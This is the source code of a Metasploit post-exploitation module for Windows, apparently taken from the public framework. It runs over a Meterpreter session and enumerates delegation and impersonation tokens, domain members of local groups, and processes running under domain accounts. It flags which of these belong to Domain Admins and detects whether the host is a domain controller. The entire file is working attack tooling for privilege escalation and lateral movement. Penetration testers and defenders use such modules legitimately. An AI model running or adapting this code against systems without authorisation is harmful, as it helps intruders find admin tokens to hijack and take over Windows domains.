##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Enumerate Domain Tokens',
        'Description' => %q{
          This module will enumerate tokens present on a system that are part of the
          domain the target host is part of, will also enumerate users in the local
          Administrators, Users and Backup Operator groups to identify Domain members.
          Processes will be also enumerated and checked if they are running under a
          Domain account, on all checks the accounts, processes and tokens will be
          checked if they are part of the Domain Admin group of the domain the machine
          is a member of.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform' => [ 'win'],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}") if !sysinfo.nil?
    domain = primary_domain

    if !domain.empty?
      uid = client.sys.config.getuid
      dom_admins = get_members_from_group("Domain Admins")

      if uid =~ /#{domain}/
        user = uid.split("\\")[1]
        if dom_admins.include?(user)
          print_good("Current session is running under a Domain Admin Account")
        end
      end

      if !is_dc?
        list_group_members(domain, dom_admins)
      end

      list_tokens(domain, dom_admins)
      list_processes(domain, dom_admins)
    end
  end

  # Gets the Domain Name
  def primary_domain
    dom_info = get_domain("DomainControllerName")
    if !dom_info.nil? && dom_info =~ /\./
      foo = dom_info.split('.')
      domain = foo[1].upcase
    else
      print_error("Error parsing output from the registry. (#{dom_info})")
    end
    return domain
  end

  # List Tokens precent on the domain
  def list_tokens(domain, dom_admins)
    tbl = Rex::Text::Table.new(
      'Header' => "Impersonation Tokens with Domain Context",
      'Indent' => 1,
      'Columns' =>
      [
        "Token Type",
        "Account Type",
        "Name",
        "Domain Admin"
      ]
    )
    print_status("Checking for Domain group and user tokens")
    client.core.use("incognito")
    user_tokens = client.incognito.incognito_list_tokens(0)
    user_delegation = user_tokens["delegation"].split("\n")
    user_impersonation = user_tokens["impersonation"].split("\n")

    group_tokens = client.incognito.incognito_list_tokens(1)
    group_delegation = group_tokens["delegation"].split("\n")
    group_impersonation = group_tokens["impersonation"].split("\n")

    user_delegation.each do |dt|
      next unless dt =~ /#{domain}/

      user = dt.split("\\")[1]
      if dom_admins.include?(user)
        tbl << ["Delegation", "User", dt, true]
      else
        tbl << ["Delegation", "User", dt, false]
      end
    end

    user_impersonation.each do |dt|
      next unless dt =~ /#{domain}/

      user = dt.split("\\")[1]
      if dom_admins.include?(user)
        tbl << ["Impersonation", "User", dt, true]
      else
        tbl << ["Impersonation", "User", dt, false]
      end
    end

    group_delegation.each do |dt|
      next unless dt =~ /#{domain}/

      user = dt.split("\\")[1]
      if dom_admins.include?(user)
        tbl << ["Delegation", "Group", dt, true]
      else
        tbl << ["Delegation", "Group", dt, false]
      end
    end

    group_impersonation.each do |dt|
      next unless dt =~ /#{domain}/

      user = dt.split("\\")[1]
      if dom_admins.include?(user)
        tbl << ["Impersonation", "Group", dt, true]
      else
        tbl << ["Impersonation", "Group", dt, false]
      end
    end
    results = tbl.to_s
    print_line("\n" + results + "\n")
  end

  def list_group_members(domain, dom_admins)
    tbl = Rex::Text::Table.new(
      'Header' => "Account in Local Groups with Domain Context",
      'Indent' => 1,
      'Columns' =>
      [
        "Group",
        "Member",
        "Domain Admin"
      ]
    )
    print_status("Checking local groups for Domain Accounts and Groups")
    admins = get_members_from_localgroup("Administrators")
    users = get_members_from_localgroup("users")
    backops = get_members_from_localgroup("\"Backup Operators\"")
    admins.each do |dt|
      next unless dt =~ /#{domain}/

      user = dt.split("\\")[1]
      if dom_admins.include?(user)
        tbl << ["Administrators", dt, true]
      else
        tbl << ["Administrators", dt, false]
      end
    end

    backops.each do |dt|
      next unless dt =~ /#{domain}/

      user = dt.split("\\")[1]
      if dom_admins.include?(user)
        tbl << ["Backup Operators", dt, true]
      else
        tbl << ["Backup Operators", dt, false]
      end
    end
    users.each do |dt|
      next unless dt =~ /#{domain}/

      user = dt.split("\\")[1]
      if dom_admins.include?(user)
        tbl << ["Users", dt, true]
      else
        tbl << ["Users", dt, false]
      end
    end
    results = tbl.to_s
    print_line("\n" + results + "\n")
  end

  def list_processes(domain, dom_admins)
    tbl = Rex::Text::Table.new(
      'Header' => "Processes under Domain Context",
      'Indent' => 1,
      'Columns' =>
      [
        "Name",
        "PID",
        "Arch",
        "User",
        "Domain Admin"
      ]
    )
    print_status("Checking for processes running under domain user")
    client.sys.process.processes.each do |p|
      next unless p['user'] =~ /#{domain}/

      user = p['user'].split("\\")[1]
      if dom_admins.include?(user)
        tbl << [p['name'], p['pid'], p['arch'], p['user'], true]
      else
        tbl << [p['name'], p['pid'], p['arch'], p['user'], false]
      end
    end
    results = tbl.to_s
    print_line("\n" + results + "\n")
  end

  # Function for checking if target is a DC
  def is_dc?
    is_dc_srv = false
    serviceskey = "HKLM\\SYSTEM\\CurrentControlSet\\Services"
    if registry_enumkeys(serviceskey).include?("NTDS")
      if registry_enumkeys(serviceskey + "\\NTDS").include?("Parameters")
        print_good("\tThis host is a Domain Controller!")
        is_dc_srv = true
      end
    end
    return is_dc_srv
  end
end
